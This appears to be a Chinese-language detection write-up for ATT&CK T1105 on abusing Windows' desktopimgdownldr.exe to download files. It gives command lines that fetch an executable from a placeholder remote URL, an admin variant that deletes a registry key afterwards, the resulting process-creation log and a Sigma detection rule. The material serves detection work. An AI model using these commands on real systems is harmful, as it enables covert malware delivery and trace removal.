# T1105-win-入口工具转移-desktopimgdownldr.exe(白名单)

## 来自ATT&CK的描述

攻击者可能会将工具或其他文件从外部系统转移到被攻击的环境中。可以通过命令和控制通道从外部攻击者控制的系统复制文件，用以将工具带入被攻击的网络中，或通过其他工具（如 FTP）的替代协议。 也可以使用 scp、rsync 和 sftp等本地工具在Mac和 Linux上复制文件。

## 测试案例
desktopimgdownldr.exe位于Win10的system32文件夹中，原本用于设置锁定屏幕或桌面背景图像的。

**路径:**
```bash
- c:\windows\system32\desktopimgdownldr.exe
```

普通用户可以用以下命令来实现文件下载：
```bash
set "SYSTEMROOT=C:\ProgramData" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://url/xxx.exe /eventName:desktopimgdownldr
```

管理员会多写一个注册表项，所以管理员的命令如下：
```bash
set "SYSTEMROOT=C:\ProgramData\" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://url/file.exe /eventName:desktopimgdownldr && reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP /f
```

用例：从Web服务器下载任意文件
所需权限：用户
操作系统：Windows 10
## 检测日志

windows安全日志

## 测试复现

```bash
C:\Users\liyang\Desktop\asptest>set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
```

## 测试留痕
```
已创建新进程。

  

创建者主题:

安全 ID: DESKTOP-PT656L6\liyang

帐户名: liyang

帐户域: DESKTOP-PT656L6

登录 ID: 0x47126

  

目标主题:

安全 ID: NULL SID

帐户名: -

帐户域: -

登录 ID: 0x0

  

进程信息:

新进程 ID: 0x24a4

新进程名称: C:\Windows\System32\desktopimgdownldr.exe

令牌提升类型: %%1938

强制性标签: Mandatory Label\Medium Mandatory Level

创建者进程 ID: 0x2588

创建者进程名称: C:\Windows\System32\cmd.exe

进程命令行: desktopimgdownldr.exe  /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
```
## 检测方法/思路
参考Sigma官方规则:
```yml
title: Suspicious Desktopimgdownldr Target File

id: fc4f4817-0c53-4683-a4ee-b17a64bc1039

status: experimental

description: Detects a suspicious Microsoft desktopimgdownldr file creation that stores a file to a suspicious location or contains a file with a suspicious extension

author: Florian Roth

date: 2020/07/03

references:

- https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/

- https://twitter.com/SBousseaden/status/1278977301745741825

logsource:

product: windows

category: file_event

tags:

- attack.defense_evasion

- attack.t1105

detection:

selection:

Image|endswith: svchost.exe

TargetFilename|contains: '\Personalization\LockScreenImage\'

filter1:

TargetFilename|contains: 'C:\Windows\'

filter2:

TargetFilename|contains:

- '.jpg'

- '.jpeg'

- '.png'

condition: selection and not filter1 and not filter2

fields:

- CommandLine

- ParentCommandLine

falsepositives:

- False positives depend on scripts and administrative tools used in the monitored environment

level: high
```

### 建议
从Sigma和elastic给出的规则来看，更多的是对进程和命令行参数进行监测，只要出现其中一个命令参数即告警。
## 参考推荐

MITRE-ATT&CK-T1105

<https://attack.mitre.org/techniques/T1105>

command_and_control_remote_file_copy_desktopimgdownldr

<https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/command_and_control_remote_file_copy_desktopimgdownldr.toml>

win_susp_desktopimgdownldr_file

<https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/file_event/win_susp_desktopimgdownldr_file.yml>

Desktopimgdownldr.exe

<https://lolbas-project.github.io/lolbas/Binaries/Desktopimgdownldr/>
